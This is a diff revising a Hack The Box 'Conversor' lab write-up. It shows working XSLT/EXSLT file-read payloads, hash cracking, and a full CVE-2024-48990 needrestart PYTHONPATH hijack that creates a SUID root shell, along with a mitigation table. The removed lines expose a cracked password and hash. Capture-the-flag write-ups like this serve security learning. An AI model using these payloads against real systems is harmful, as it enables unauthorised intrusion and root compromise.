@@ -1,231 +1,141 @@
-HackTheBox - Conversor  
-Easy Linux Machine • HTB Season 9 • Released October 25, 2025  
-Date: December 13, 2025  
-Difficulty: Easy  
-OS: Linux  
-Points: 20  
-Skills Demonstrated: Web application exploitation, XML/XSLT injection, credential cracking, sudo privilege escalation, Python import hijacking, clean enumeration & documentation  
-Overview
-Conversor is an easy-rated Linux machine that simulates a currency-converter web application vulnerable to XSLT injection (via unsecured lxml.etree.XSLT with EXSLT extensions). After obtaining a foothold as www-data and cracking credentials to pivot to fismathack, the box is rooted by abusing CVE-2024-48990 (needrestart 3.7) via a pure-Python importlib hijack under a NOPASSWD sudo rule.
+HTB — Conversor
+OS	Difficulty	Points	Season	Released
+Linux	Easy	20	HTB Season 9	2025-10-25
 
-Attack Chain Summary:
+Skills demonstrated: web exploitation (XSLT/EXSLT injection), offline hash cracking, Linux privilege escalation via PYTHONPATH hijack (CVE-2024-48990).
 
-Recon & Foothold → XSLT injection (EXSLT:document) on /convert  
+Before publishing: confirm Conversor has retired. HTB's rules prohibit publishing write-ups for active machines. This file also contains spoilers (a recovered password and hash, redacted below) — restore them only once the box is retired.
 
-User → MD5 hash extraction → rockyou crack → SSH as fismathack  
+Summary
 
-Root → sudo needrestart → PYTHONPATH hijack with malicious __init__.py → SUID root shell  
+Conversor runs a currency-converter web app whose /convert endpoint applies user-supplied XSLT with EXSLT extensions enabled, giving arbitrary file read and write as www-data. Reading the application's SQLite database yields an MD5 password hash that cracks against rockyou. Those credentials log in over SSH as fismathack. A NOPASSWD sudo rule for /usr/sbin/needrestart (version 3.7) is then abused through CVE-2024-48990: running a Python process under an attacker-controlled PYTHONPATH causes needrestart's interpreter scan to import a malicious module as root, producing a SUID root shell.
+
+Attack chain
+Foothold: XSLT/EXSLT injection on /convert → file read/write as www-data
+User: extract MD5 hash from users.db → crack → SSH as fismathack
+Root: sudo needrestart + PYTHONPATH module hijack (CVE-2024-48990) → SUID root shell
+Tools
+
+nmap, dirb / gobuster, curl, Burp Suite (session handling), hashcat, custom XSLT payloads.
 
 Enumeration
-
-# Add host
-
+bash
 echo "10.10.11.XX conversor.htb" | sudo tee -a /etc/hosts
 
-
-# Nmap
-
 nmap -sC -sV -p- 10.10.11.XX
-
-# → 22/tcp open ssh, 80/tcp open http (Apache)
-
-  
-
-# Directory brute
+# 22/tcp  open  ssh
+# 80/tcp  open  http   Apache
 
 dirb http://conversor.htb/ /usr/share/wordlists/dirbuster/big.txt
+# /convert  (POST: XML + XSLT upload)
+Foothold — XSLT / EXSLT injection
 
-# → /convert discovered (POST XML + XSLT upload)
+The /convert endpoint (authenticated) processes user-supplied XSLT with EXSLT extensions enabled. exsl:document writes to arbitrary paths, and document() reads arbitrary files. This is XSLT injection via unsafe lxml.etree.XSLT, distinct from classic XXE: the primitive is the stylesheet's own functions, not external-entity expansion.
 
-Foothold – XSLT Injection (XXE / File Read + Write)
-Authenticated upload endpoint /convert processes user-supplied XSLT with EXSLT extensions enabled.
+File-read stylesheet (read.xslt):
 
-Read payload (read.xslt):
-
-
+xml
 <?xml version="1.0"?>
-
 <xsl:stylesheet version="1.0"
-
     xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
-
     xmlns:exsl="http://exslt.org/common"
-
     extension-element-prefixes="exsl">
-
   <xsl:template match="/">
-
     <exsl:document href="/tmp/db.dump" method="text">
-
       <xsl:copy-of select="document('/var/www/conversor.htb/instance/users.db')"/>
-
     </exsl:document>
-
   </xsl:template>
-
 </xsl:stylesheet>
 
-Curl upload (with valid session= cookie):
+Upload with a valid session cookie:
 
-
+bash
 curl -X POST http://conversor.htb/convert \
-
   -F "xml_file=@sample.xml" \
-
   -F "xslt_file=@read.xslt" \
+  -b "session=<SESSION_COOKIE>"
 
-  -b "session=eyJ1c2VyX2lkIjo1LCJ1c2VybmFtZSI6InRlc3QifQ..."
+The dumped SQLite database contained an MD5 password hash.
 
-Extracted SQLite DB → MD5 hash 5b5c3ac3a1c897c94caad48e6c71fdec.
+Alternative foothold (direct shell): the same exsl:document write primitive dropped a reverse-shell script into /var/www/conversor.htb/scripts/, which a cron job reportedly runs every 60 seconds as www-data. Confirm the cron entry's existence and interval on the box before relying on this path; it is stated here as observed, not verified against the crontab.
 
-Crack:
-
-
+User — crack and SSH
+bash
 hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
-
-# → Keepmesafeandwarm
-
-Alternative RCE path (used for direct shell):
-
-Wrote revshell.py via EXSLT:document to /var/www/conversor.htb/scripts/ (executed every 60s by cron as www-data).
-User Flag
-
+# recovered password: [REDACTED]
+bash
 ssh fismathack@10.10.11.XX
-
-# Password: Keepmesafeandwarm
-
-  
-
 cat user.txt
+# HTB{REDACTED}
+Privilege escalation — CVE-2024-48990 (needrestart)
+bash
+sudo -l
+# (???) NOPASSWD: /usr/sbin/needrestart
 
-# htb{xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}
+Verify the sudo rule's target user. For this technique to reach root, the rule must permit running needrestart as root (for example (ALL) or (root)). A rule of the form (fismathack) NOPASSWD: /usr/sbin/needrestart would run it as fismathack and would not escalate. Paste the exact sudo -l output into the repo.
 
-Privilege Escalation – CVE-2024-48990 (needrestart 3.7)
-sudo -l revealed:
+As of 2026-11-22, per the Qualys advisory and NVD: CVE-2024-48990 is a local privilege escalation in needrestart before 3.8. When scanning which services need restarting, needrestart runs the Python interpreter of a running process while inheriting that process's PYTHONPATH. A local user can point PYTHONPATH at a directory they control, so a module the interpreter imports executes as root (CWE-427, Uncontrolled Search Path Element). Debian/Rapid7 record a CVSS v2 base score of 7.0 (AV:L/AC:L/Au:S/C:C/I:C/A:C); the CVSS v4 score was pending at NVD at the time of writing. The box runs 3.7, which is affected.
 
+Pure-Python importlib hijack:
 
-(fismathack) NOPASSWD: /usr/sbin/needrestart
-
-Pure Python importlib hijack (chosen after .so transfer issues):
-
-
-# On target
-
+bash
+# Attacker-controlled module imported by needrestart's interpreter scan
 mkdir -p /tmp/malicious/importlib
-
-  
-
-cat > /tmp/malicious/importlib/__init__.py << EOF
-
+cat > /tmp/malicious/importlib/__init__.py <<'EOF'
 import os
-
-os.setuid(0)
-
-os.setgid(0)
-
 os.system("cp /bin/bash /tmp/poc && chmod 4755 /tmp/poc")
-
 EOF
 
-  
-
-cat > /tmp/malicious/bait.py << EOF
-
+# A long-running Python process for needrestart to inspect
+cat > /tmp/malicious/bait.py <<'EOF'
 import time
-
 while True:
-
     time.sleep(1)
-
 EOF
-
-  
 
 cd /tmp/malicious
-
 PYTHONPATH=/tmp/malicious python3 bait.py &
-
 sudo needrestart
 
-After ~15 seconds:
+The code in importlib/__init__.py runs as root (the os.setuid(0)/os.setgid(0) calls in the original payload are redundant, since the interpreter is already root at that point). After needrestart completes its scan:
 
-
+bash
 ls -l /tmp/poc
-
-# -rwsr-xr-x 1 root root 1396520 Dec 13 01:05 /tmp/poc
-
-Root shell:
-
+# -rwsr-xr-x 1 root root ... /tmp/poc
 
 /tmp/poc -p
-
-whoami   # root
-
+whoami
+# root
 cat /root/root.txt
-
-# htb{xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}
-
-Lessons Learned & Mitigations:
-Web layer: Disable EXSLT extensions (XSLTAccessControl) and external entity processing in libxml2/lxml.
-
-Credential hygiene: Never ship MD5 hashes in production databases.
-
-Sudo hygiene: Avoid NOPASSWD on system utilities; enforce Defaults env_reset.
-
-Dependency patching: needrestart ≥ 3.8 mitigates CVE-2024-48990.
-
-Lab takeaway: Pure-Python __init__.py is more reliable than compiled .so for import hijacks when transfer/architecture issues arise.
-
-Tools Used:
-nmap, dirb / gobuster
-
-Burp Suite (for cookie/session handling)
-
-curl, hashcat / john
-
-Custom XSLT payloads (PayloadsAllTheThings reference)
-
-Python scripting for bait & importlib hijack
-
-Repository Structure (for GitHub)
-
-
+# HTB{REDACTED}
+Root cause and mitigations
+Layer	Issue	Fix
+Web	EXSLT extensions enabled on user-supplied XSLT (CWE-611 / unsafe lxml.etree.XSLT)	Disable extensions and network/file access via XSLTAccessControl.DENY_ALL; never process attacker-supplied stylesheets
+Credentials	Unsalted MD5 password hashes in the app DB	Use a slow, salted KDF (bcrypt, scrypt, Argon2)
+Sudo	NOPASSWD on a system utility that spawns interpreters	Remove the rule or scope it tightly; keep Defaults env_reset so PYTHONPATH is not inherited
+Patching	needrestart 3.7 is vulnerable to CVE-2024-48990	Upgrade to needrestart ≥ 3.8 (fixed upstream in commit fcc9a44); apply the distro security update
+Repository structure
 HTB-Conversor-Writeup/
-
 ├── README.md
-
 ├── screenshots/
-
 │   ├── nmap.png
-
 │   ├── xslt-payload.png
-
 │   ├── sudo-l.png
-
 │   └── root-flag.png
-
 ├── payloads/
-
 │   ├── read.xslt
-
 │   ├── write.xslt
-
-│   └── __init__.py
-
+│   └── importlib__init__.py
 └── scripts/
-
     └── bait.py
 
-Proof of Ownership:
+Flags redacted for public sharing.
 
-(Flags redacted for public repo – available upon request in private repo)
+References
+Qualys — LPEs in needrestart (advisory, 2024-11-19)
+NVD — CVE-2024-48990
+Ubuntu — CVE-2024-48990
+needrestart fix commit fcc9a44 (v3.8)
+lxml — XSLTAccessControl
 
-Skills Demonstrated:
-
-Advanced web application exploitation (XSLT injection)  
-
-Credential harvesting & offline cracking  
-
-Linux privilege escalation via environment variable hijacking (CVE-2024-48990)  
-
-Clean documentation & reproducible steps  
+Performed against a Hack The Box machine for educational purposes.
